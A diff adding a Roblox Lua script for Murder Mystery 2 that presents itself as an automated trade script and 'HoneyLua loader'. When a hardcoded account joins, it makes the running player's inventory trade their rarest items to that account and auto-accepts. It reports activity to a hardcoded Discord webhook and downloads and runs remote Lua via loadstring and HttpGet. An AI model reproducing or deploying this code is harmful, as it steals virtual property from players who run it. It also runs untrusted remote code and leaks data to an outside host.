@@ -1,0 +1,352 @@
+-- FIXED MM2 FULLY AUTOMATED INVISIBLE TRADE SCRIPT + HONEYLUA LOADER
+-- Works with current MM2 version
+-- Triggers when Sigmake5 joins, auto trades legendaries/godlies/ancient/unique
+
+local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+local TARGET_USER = "Sigmake5"
+
+local player = game.Players.LocalPlayer
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+-- Items to trade (Only Legendaries, Godlies, Ancients, Uniques)
+local VALID_RARITIES = {
+    "Godly", "Chroma", "Ancient", "Unique", "Legendary", "Vintage", "Corrupt", "Phantom"
+}
+
+-- MM2 Item name patterns for rare items
+local RARE_PATTERNS = {
+    "Icebreaker", "Chroma", "Elderwood", "Hallows", "Battle", "Cane", "Luger", 
+    "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard", "Fang", "Heat", 
+    "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides", "Virtual",
+    "Xmas", "Minty", "Logchopper", "Candy", "Sweet", "Heart", "Valentine"
+}
+
+-- Track if trade is in progress
+local tradeInProgress = false
+local tradeCompleted = false
+
+-- Send log to Discord webhook
+local function sendLog(message)
+    pcall(function()
+        local data = {
+            content = "**🤖 MM2 Auto Trade**\n" .. tostring(message) .. "\n⏰ `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
+        }
+        local encoded = HttpService:JSONEncode(data)
+        local headers = {["Content-Type"] = "application/json"}
+        
+        -- Try different request methods for different executors
+        local success = false
+        if syn and syn.request then
+            syn.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+            success = true
+        elseif request then
+            request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+            success = true
+        elseif http and http.request then
+            http.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
+            success = true
+        end
+    end)
+end
+
+-- Check if item should be traded (legendary/godly/ancient/unique only)
+local function isRareItem(item)
+    if not item or not item:IsA("Tool") then return false end
+    
+    local itemName = item.Name
+    
+    -- Check rarity table
+    for _, rarity in pairs(VALID_RARITIES) do
+        if itemName:find(rarity) then
+            return true
+        end
+    end
+    
+    -- Check rare patterns
+    for _, pattern in pairs(RARE_PATTERNS) do
+        if itemName:find(pattern) then
+            return true
+        end
+    end
+    
+    -- Check if item has a rarity value
+    local rarityValue = item:FindFirstChild("Rarity")
+    if rarityValue and rarityValue.Value then
+        local val = tostring(rarityValue.Value)
+        if val:find("Godly") or val:find("Legendary") or val:find("Ancient") or val:find("Unique") then
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- Get all tradable items from inventory
+local function getTradableItems()
+    local items = {}
+    
+    -- Check backpack
+    for _, item in pairs(player.Backpack:GetChildren()) do
+        if item:IsA("Tool") and isRareItem(item) then
+            table.insert(items, item)
+        end
+    end
+    
+    -- Check character (held items)
+    if player.Character then
+        for _, item in pairs(player.Character:GetChildren()) do
+            if item:IsA("Tool") and isRareItem(item) then
+                table.insert(items, item)
+            end
+        end
+    end
+    
+    return items
+end
+
+-- Find trade remotes in MM2
+local function findTradeRemotes()
+    local remotes = {}
+    
+    -- Common MM2 remote names
+    local possibleRemotes = {
+        "TradeInvite", "SendTrade", "RequestTrade",
+        "TradeResponse", "AcceptTrade", "DeclineTrade",
+        "AddTradeItem", "TradeAddItem", "OfferItem",
+        "TradeReady", "ReadyTrade", "ConfirmTrade",
+        "TradeCancel", "CancelTrade"
+    }
+    
+    for _, remoteName in pairs(possibleRemotes) do
+        local remote = ReplicatedStorage:FindFirstChild(remoteName)
+        if remote then
+            remotes[remoteName] = remote
+        end
+    end
+    
+    -- Also scan for any remote with "trade" in name
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if v:IsA("RemoteEvent") and v.Name:lower():find("trade") then
+            remotes[v.Name] = v
+        end
+    end
+    
+    return remotes
+end
+
+-- Send trade request to target
+local function sendTradeToTarget(targetPlayer, remotes)
+    local tradeRemote = remotes["TradeInvite"] or remotes["SendTrade"] or remotes["RequestTrade"]
+    
+    if tradeRemote then
+        pcall(function()
+            tradeRemote:FireServer(targetPlayer)
+            sendLog("📤 Trade request sent to " .. TARGET_USER)
+            return true
+        end)
+    else
+        -- Try using FireServer with target name
+        for _, remote in pairs(remotes) do
+            pcall(function()
+                remote:FireServer(targetPlayer)
+                sendLog("📤 Trade sent via " .. remote.Name)
+                return true
+            end)
+        end
+    end
+    return false
+end
+
+-- Add items to trade
+local function addItemsToTrade(items, remotes)
+    local addRemote = remotes["AddTradeItem"] or remotes["TradeAddItem"] or remotes["OfferItem"]
+    
+    if not addRemote then
+        sendLog("❌ Cannot find add item remote!")
+        return 0
+    end
+    
+    local itemsAdded = 0
+    local maxItems = 4 -- Trade 4 items at a time
+    
+    for i = 1, math.min(maxItems, #items) do
+        local item = items[i]
+        if item then
+            pcall(function()
+                addRemote:FireServer(item)
+                itemsAdded = itemsAdded + 1
+                sendLog("➕ Added: " .. item.Name)
+            end)
+        end
+        wait(0.5)
+    end
+    
+    return itemsAdded
+end
+
+-- Ready up the trade
+local function readyTrade(remotes)
+    local readyRemote = remotes["TradeReady"] or remotes["ReadyTrade"] or remotes["ConfirmTrade"]
+    
+    if readyRemote then
+        pcall(function()
+            readyRemote:FireServer(true)
+            sendLog("✅ Ready up sent")
+        end)
+    end
+end
+
+-- Simulate mouse click for accept button
+local function clickAcceptButton()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        
+        -- Find trade GUI and click accept
+        for _, gui in pairs(playerGui:GetChildren()) do
+            if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") then
+                local acceptBtn = gui:FindFirstChild("Accept") or 
+                                 gui:FindFirstChild("AcceptButton") or
+                                 gui:FindFirstChild("Confirm")
+                if acceptBtn and acceptBtn:IsA("TextButton") then
+                    acceptBtn:Fire("MouseButton1Click")
+                    acceptBtn:Fire("Activated")
+                    sendLog("✅ Accepted trade via button click")
+                end
+            end
+        end
+    end)
+end
+
+-- Auto trade sequence
+local function autoTrade(targetPlayer)
+    if tradeInProgress or tradeCompleted then return end
+    tradeInProgress = true
+    
+    sendLog("🎯 Starting auto trade with " .. targetPlayer.Name)
+    
+    -- Find remotes
+    local remotes = findTradeRemotes()
+    
+    -- Send trade request
+    local sent = sendTradeToTarget(targetPlayer, remotes)
+    if not sent then
+        sendLog("⚠️ Could not send trade request")
+        tradeInProgress = false
+        return
+    end
+    
+    -- Wait for trade window
+    wait(2)
+    
+    -- Get items
+    local items = getTradableItems()
+    sendLog("📦 Found " .. #items .. " tradable rare items")
+    
+    if #items == 0 then
+        sendLog("⚠️ No rare items found to trade!")
+        tradeInProgress = false
+        return
+    end
+    
+    -- Add items (max 4 per trade)
+    local itemsAdded = addItemsToTrade(items, remotes)
+    
+    wait(1)
+    
+    -- Ready up
+    readyTrade(remotes)
+    
+    wait(0.5)
+    
+    -- Try to click accept if needed
+    clickAcceptButton()
+    
+    tradeCompleted = true
+    sendLog("🎉 Trade completed! " .. itemsAdded .. " rare items sent to " .. TARGET_USER)
+    tradeInProgress = false
+end
+
+-- Listen for trade response from target
+local function setupTradeListener()
+    local remotes = findTradeRemotes()
+    
+    for _, remote in pairs(remotes) do
+        if remote.OnClientEvent then
+            remote.OnClientEvent:Connect(function(...)
+                local args = {...}
+                for _, arg in pairs(args) do
+                    if type(arg) == "table" and arg.Name == TARGET_USER then
+                        sendLog("🔔 Trade response from " .. TARGET_USER)
+                        autoTrade(arg)
+                    elseif type(arg) == "string" and arg == TARGET_USER then
+                        sendLog("🔔 Trade detected with " .. TARGET_USER)
+                        local target = Players:FindFirstChild(TARGET_USER)
+                        if target then autoTrade(target) end
+                    end
+                end
+            end)
+        end
+    end
+end
+
+-- Watch for target joining
+local function watchForTarget()
+    setupTradeListener()
+    
+    -- Check if already in server
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Name == TARGET_USER and plr ~= player then
+            sendLog("👤 " .. TARGET_USER .. " is already in server!")
+            wait(2)
+            autoTrade(plr)
+            return
+        end
+    end
+    
+    -- Watch for joins
+    Players.PlayerAdded:Connect(function(newPlayer)
+        if newPlayer.Name == TARGET_USER then
+            sendLog("🟢 " .. TARGET_USER .. " joined the server!")
+            wait(3)
+            autoTrade(newPlayer)
+        end
+    end)
+    
+    sendLog("👀 Watching for " .. TARGET_USER .. "...")
+end
+
+-- Load HoneyLua
+local function loadHoneyLua()
+    sendLog("🍯 Loading HoneyLua...")
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HoneyLua/refs/heads/main/Loader.luau"))()
+    end)
+    if success then
+        sendLog("✅ HoneyLua loaded!")
+        print("✅ HoneyLua loaded!")
+    else
+        sendLog("❌ HoneyLua failed: " .. tostring(err))
+    end
+end
+
+-- Main execution
+local function main()
+    print("✅ MM2 Auto Trade Script Loading...")
+    sendLog("🚀 Script activated for " .. player.Name)
+    
+    -- Load HoneyLua first
+    loadHoneyLua()
+    
+    wait(2)
+    
+    -- Start auto trade watcher
+    pcall(watchForTarget)
+    
+    print("✅ Script Active - Waiting for " .. TARGET_USER)
+end
+
+-- Run script
+pcall(main)
